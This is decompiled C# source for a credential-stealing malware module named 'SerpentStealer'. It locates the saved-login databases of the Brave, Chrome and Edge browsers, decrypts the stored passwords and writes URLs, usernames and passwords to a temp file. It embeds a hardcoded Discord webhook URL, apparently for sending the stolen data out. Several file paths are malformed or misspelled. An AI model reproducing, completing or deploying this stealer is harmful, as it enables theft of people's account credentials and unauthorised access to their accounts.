using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace Modules
{
	// Token: 0x02000014 RID: 20
	public class PasswordStealer
	{
		// Token: 0x06000021 RID: 33 RVA: 0x000039B0 File Offset: 0x00001BB0
		[global::System.Runtime.CompilerServices.NullableContext(1)]
		public string[] Run()
		{
			Console.WriteLine("[+] Executing Passwords");
			Directory.CreateDirectory(Path.GetTempPath() + "serpent");
			string[] array = new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "Google\\Chrome\\User Data\\default\\Login Data",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "Microsoft\\Edge\\User Data\\Default\\Login Data"
			};
			string text = "";
			foreach (string text2 in array)
			{
				IEnumerable<Tuple<string, string, string>> enumerable = PasswordStealer.Passwords.ReadPass(text2);
				if (File.Exists(text2))
				{
					text += "SerpentStealer\r\n\r\n";
					foreach (Tuple<string, string, string> tuple in enumerable)
					{
						if (tuple.Item2.Length > 0 && tuple.Item2.Length > 0)
						{
							text = string.Concat(new string[] { text, "URL: ", tuple.Item1, "\r\nLogin: ", tuple.Item2, "\r\nPassword: ", tuple.Item3, "\r\n" });
							text += " \r\n";
						}
					}
				}
			}
			if (File.Exists(Path.GetTempPath() + "serpent\r\n                        \\Login Data"))
			{
				File.Delete(Path.GetTempPath() + "serpent\r\n                        \\Login Data");
			}
			string tempPath = Path.GetTempPath();
			File.WriteAllText(tempPath + "/serpent/Passwords.txt", text);
			string text3 = tempPath + "/serpent/Passwords.txt";
			List<string> list = new List<string>();
			using (StreamReader streamReader = new StreamReader(new FileStream(text3, FileMode.Open, FileAccess.Read), Encoding.UTF8))
			{
				string text4;
				while ((text4 = streamReader.ReadLine()) != null)
				{
					list.Add(text4);
				}
			}
			return list.ToArray();
		}

		// Token: 0x0400002F RID: 47
		[global::System.Runtime.CompilerServices.Nullable(1)]
		public static string Webhook_link = "https://discord.com/api/webhooks/1156720932375756921/Xu5g1XzMRXTKDzrIOMcPMC1orYzXGQKBYTTRVOX4oR-IbivHh0LzqCucl2b-obrco6jj";

		// Token: 0x02000015 RID: 21
		private class Passwords
		{
			// Token: 0x06000024 RID: 36 RVA: 0x00003BB8 File Offset: 0x00001DB8
			[global::System.Runtime.CompilerServices.NullableContext(1)]
			public static IEnumerable<Tuple<string, string, string>> ReadPass(string A_0)
			{
				if (File.Exists(Path.GetTempPath() + "serprent\\Login Data"))
				{
					File.Delete(Path.GetTempPath() + "serprent\\Login Data");
				}
				byte[] key = AesGcm256.GetKey(A_0);
				string text = "Data Source=" + A_0 + ";pooling=false";
				using (SQLiteConnection conn = new SQLiteConnection(text))
				{
					using (SQLiteCommand cmd = conn.CreateCommand())
					{
						cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
						conn.Open();
						using (SQLiteDataReader reader = cmd.ExecuteReader())
						{
							while (reader.Read())
							{
								byte[] array;
								byte[] array2;
								AesGcm256.prepare((byte[])reader[0], out array, out array2);
								string text2 = AesGcm256.decrypt(array2, key, array);
								yield return Tuple.Create<string, string, string>(reader.GetString(2), reader.GetString(1), text2);
							}
						}
						SQLiteDataReader reader = null;
						conn.Close();
					}
					SQLiteCommand cmd = null;
				}
				SQLiteConnection conn = null;
				yield break;
				yield break;
			}
		}
	}
}
